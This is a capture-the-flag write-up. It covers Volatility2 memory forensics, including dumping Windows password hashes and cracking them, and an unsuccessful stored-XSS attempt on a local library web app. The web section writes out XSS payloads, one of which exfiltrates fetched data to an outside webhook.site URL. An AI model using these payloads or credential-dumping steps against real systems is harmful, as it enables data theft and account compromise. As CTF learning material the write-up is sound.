# Forensic

Gotham

When I first received the challenge, the only artifact provided was a memory dump. Before touching tools, I checked the file size and format to understand what I was working with. It appeared to contain complete system memory, so the goal was clear — enumerate processes, locate artifacts, extract data, and assemble flags.

## Volatility2

Volatility is the standard toolkit for memory analysis ,  Volatility2 more suited for deep forensic extraction here.

To proceed, I installed the required Volatility2 dependencies:
```
pip2 install pycryptodome
pip2 install distorm3
pip2 install yara-python
```

Then I loaded the memory file using Volatility2:

```
python2 vol.py -f gotham.raw imageinfo
```

Step 1 – Extracting Terminal History

Command history often reveals flags or hints. So I ran:
```
python2 vol.py -f gotham.raw --profile=Win7SP1x64 cmdscan
```

Among the recovered commands were:

whoami
dir
bi0s
dfirlabs
Ymkwc2N0Znt3M2xjMG0zXw==
azr43ln1ght.github.io
Azr43lKn1ght
did you find flag1?


That Base64-looking string was suspicious:
```
echo "Ymkwc2N0Znt3M2xjMG0zXw==" | base64 -d
```

→ Output revealed FLAG 1

Step 2 – Process Dumping for More Flags

Next, I listed running processes using pstree/plist and identified notepad.exe (PID 2592) as a good target to dump:
```
strings -el 2592.dmp | grep -i flag
```

Two Base64 values popped up:

flag3 = aDBwM190aDE1Xw==
flag4 = YjNuM2YxNzVfeTB1Xw==


Decoded:
```
echo "YjNuM2YxNzVfeTB1Xw==" | base64 -d 
→ b3n3f175_y0u
```
```
echo "aDBwM190aDE1Xw==" | base64 -d
→ h0p3_th15_
```

So now we had FLAG 3 & FLAG 4.

Step 3 – The RAR Archive (Flag 5)

Volatility's filescan revealed a RAR file:
```
filescan | grep flag5
```

Dumped the offset → extracted as:
```
mv file.None.0xfffffa80049f86a0.dat flag5.rar
unrar x flag5.rar
```

The file requested a password — likely the system password. Using hashdump:
```
python2 vol.py -f gotham.raw --profile=Win7SP1x64 hashdump
```

One of the password hashes belonged to user bruce. Cracked using hashcat and the correct password unlocked flag.txt, which contained:
```
bTByM18xMzMzNzQzMX0=
echo "bTByM18xMzMzNzQzMX0=" | base64 -d
→ m0r3_13337431}
```

This gave FLAG 5 (final part).

Flag 2

The remaining part was likely embedded in a paint/MS-Paint memory segment. After dumping, the recovered BMP was too blurred and unreadable but after some time and some tools the flag was t0_df1r_l4b5.

Final Reconstructed Flag
```
bi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}
```

# Web Exploitation

Step 1: Initial Exploration

Accessed the ViteLibrary web application at localhost:50001
Found a library management system where users can add books with title, author, and page count
Noticed a share feature at ```/liteShare/:user/:liteId```
Tested login functionality with admin:admin credentials - successfully logged in

Step 2: Source Code Analysis

Examined scripts.js and found vulnerable code:
```
javascriptlibraryRoot.innerHTML += cardTemplate
    .replace("Book Title", book.title)
    .replace("Book Author", book.author);
```
User input directly inserted into innerHTML without sanitization Stored XSS vulnerability identified

Step 3: Understanding Security Controls

Checked main.js and found CSP configuration:

Blocks inline <script> tags
Allows inline event handlers like onerror


Discovered toTitleCase() function processes author field (line 327)

Capitalizes first letter of each word
Would break payloads like onerror → Onerror


Found /getBooks endpoint limits results to 9 books (line 271, MAX_VIEWABLE_BOOKS_LIMIT = 9)

Step 4: First XSS Attempt Author Field
Created book using browser console:
```
javascriptfetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: 'Test Book',
    author: `<img src=x onerror=alert(1)>`,
    pages: 100,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
});
```

Result: Book created but XSS didn't execute toTitleCase() broke the payload

Step 5: Second Attempt  (Title Field)

Moved payload to title field to bypass toTitleCase():

```
javascriptfetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: `<img src=x onerror="fetch('/getBooks').then(r=>r.json()).then(b=>fetch('https://webhook.site/3b6eb027-b438-4e8e-9b77-72893bc3d0e6?flag='+encodeURIComponent(JSON.stringify(b))))">`,
    author: 'Test',
    pages: 100,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
});
```
Result: Book created successfully with liteId: hy2iGMCe9a

Step 6: Testing XSS Execution

Opened incognito window
Logged in as admin:admin
```
Visited http://localhost:50001/liteShare/hacker/hy2iGMCe9a
```
Checked webhook.site

Result: Webhook received request at /flag endpoint but no query parameters - data not exfiltrated


Step 7: Debugging with Simple Alert
Created new book to test if XSS executes at all:
```
javascriptfetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: `<img src=x onerror="alert('XSS Executed')">`,
    author: 'Test',
    pages: 100,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
});
```
Visited as admin in incognito window

Result: No alert appeared - XSS not executing
Step 8: Checking Admin's Books
Ran in admin browser console:
```
javascriptfetch('/getBooks')
  .then(r => r.json())
  .then(books => console.log('Admin books:', books));
```

Examining startingData.json
Opened startingData.json to see all admin books - found 13 total books including:
json{
    "author": "Maddd Max",
    "title": "The Sound Of The Flag Whirling",
    "link": "https://example.com?flag=nite{test_flag_stp}",
    "pages": 326,
    "liteId": "2hdke-6sh3"
}
Position: Book #11 out of 13

/getBooks endpoint returns maximum 9 books due to MAX_VIEWABLE_BOOKS_LIMIT = 9
Flag is in book #11 - unreachable via /getBooks
Even if XSS worked perfectly, it couldn't access the flag book

Attempted Alternative Approaches
1) Tried various payload modifications
2) navigator.sendBeacon() for CORS bypass
3) Base64 encoding data
4) POST requests instead of GET
5) Direct cookie theft

All failed - likely due to combination of:

toTitleCase() issues in author field
CSP blocking certain approaches
Book limit preventing flag access


Conclusion
We found ```nite{test_flag_stp}``` flag at liteId: 2hdke-6sh3 in the startingData.json file, but this appears to be a test flag for local development. The actual flag would be dynamically set on the real CTF server.
